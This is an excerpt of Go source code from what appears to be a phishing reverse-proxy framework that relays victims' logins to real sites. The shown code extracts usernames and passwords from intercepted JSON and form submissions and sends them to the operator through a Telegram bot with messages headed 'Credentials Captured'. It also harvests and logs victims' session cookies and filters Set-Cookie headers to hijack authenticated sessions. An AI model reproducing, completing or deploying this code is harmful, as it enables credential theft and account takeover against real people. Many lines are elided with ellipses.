...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			// capture all cookies from request cookie hader 
			// cookies := req.Cookies()
			// for _, ck := range cookies {
			// 	log.Info("[%s] cookie captured from request : %s=%s", hiblue.Sprint("request"), ck.Name, ck.Value)
			// }
			...
			if phished {
				...
				if p.handleSession(req.Host) && pl != nil {
					...
					log.Info("session cookie name: %s", session_cookie)
					if err == nil {
					...
					if err == nil {
						...
						if json_re.MatchString(contentType) {
							...
							if pm != nil && len(pm) > 1 {
								...
								// Send immediate Telegram notification with username
								...
								if teletoken != "" && chatid != "" {
									...
									username := ""
									if session, ok := p.sessions[ps.SessionId]; ok {
										username = session.Username
									}
									
									// Prepare and send Telegram message
									apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", teletoken)
									message := fmt.Sprintf("🔐 Credentials Captured\n\nUsername: %s\nPassword: %s\nPhishlet: %s", 
										username, pm[1], ps.PhishletName)
									...
									if err != nil {
										log.Error("Telegram send error: %v", err)
									} else {
										defer resp.Body.Close()
										log.Info("[%d] Telegram notification sent for password capture", ps.Index)
									}
								} else {
									log.Warning("[%d] Telegram credentials not configured, skipping notification", ps.Index)
								}
							}
						}
							...
							if len(password) > 0 && strings.ToLower(password) != "normal" && trigger == 1 && p.cfg.general.Teletoken != "" && p.cfg.general.Chatid !=  "" {
								...
								for k, v := range req.PostForm {
									...
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										...
										if pm != nil && len(pm) > 1 {
											...
											// Send immediate Telegram notification for form-encoded password
											if p.cfg.general.Teletoken != "" && p.cfg.general.Chatid != "" {
												...
												// Prepare and send Telegram message
												apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", p.cfg.general.Teletoken)
												message := fmt.Sprintf("🔐 Form Password Captured\n\nUsername: %s\nPassword: %s\nPhishlet: %s", 
													username, pm[1], ps.PhishletName)
												
												var payload map[string]string
												if pm[1] != "normal" {
													payload = map[string]string{
														"chat_id": p.cfg.general.Chatid,
														"text":    message,
													}
												}
												...
												if err != nil {
													...
													defer resp.Body.Close()
													log.Info("[%d] Telegram notification sent for form password capture", ps.Index)
												}
											} else {
												log.Warning("[%d] Telegram credentials not configured, skipping notification", ps.Index)
											}
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			// use function to check if there is set cookie hader and if it has value of session id to delete that cookie then delete that hader
			func(resp *http.Response) {
				// Get the actual session cookie name for this phishlet
				sessionCookieName := getSessionCookieName(ps.PhishletName, p.cookieName)
				
				// Get all Set-Cookie header values
				setCookies := resp.Header.Values("Set-Cookie")
				if len(setCookies) > 0 {
					// Filter out cookies matching the session cookie name
					var filteredCookies []string
					for _, setCookie := range setCookies {
						// Parse the cookie to check its name
						parts := strings.Split(setCookie, ";")
						if len(parts) > 0 {
							cookiePart := strings.TrimSpace(parts[0])
							cookieName := ""
							if idx := strings.Index(cookiePart, "="); idx > 0 {
								cookieName = cookiePart[:idx]
							}
							// Keep cookies that don't match the session cookie name
							if cookieName != sessionCookieName {
								filteredCookies = append(filteredCookies, setCookie)
							}
						}
					}
			...
			log.Info("[%d] received %d cookies from %s", ps.Index, len(cookies), req_hostname)
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie
				// print cookie with name and value 
				log.Info("received cookie: %s", ck.String())
				...
				// print pl and session id
				// log.Info("pl: %v, session id: %s", pl, ps.SessionId)
				if pl != nil || ps.SessionId != "" {
					c_domain := ck.Domain
					if c_domain == "" {
					...
					log.Info("[++++]%s: %s = %s", c_domain, ck.Name, ck.Value)
					var at *CookieAuthToken
					if pl != nil {
					...
					if 1 == 1 {
						s, ok := p.sessions[ps.SessionId]
						log.Info("++ session: %v, ok: %v", s, ok)
						if ok && (s.IsAuthUrl || !s.IsDone) {
							// print all tings from if condiftion
							log.Info("session found for id: %s, isAuthUrl: %v, isDone: %v", ps.SessionId, s.IsAuthUrl, s.IsDone)
							if ck.Value != "" && ((at != nil && at.always) || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
				...
				// print how many tiokens are added 
				log.Info("[%d] cookie set: %s", ps.Index, ck.String())
			}
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}
